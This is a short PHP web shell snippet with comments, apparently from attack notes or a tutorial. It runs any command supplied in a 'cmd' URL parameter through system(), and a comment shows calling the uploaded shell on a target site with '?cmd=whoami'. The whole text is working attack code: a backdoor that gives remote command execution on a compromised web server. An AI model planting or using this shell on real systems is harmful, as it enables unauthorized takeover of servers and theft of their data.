//This shell works by getting a web server to exececute commands we pass
<?php
if (isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
//We then pass commands to our uploaded shell using https://vulnerablesite.com/uploads/shell.php?cmd=whoami
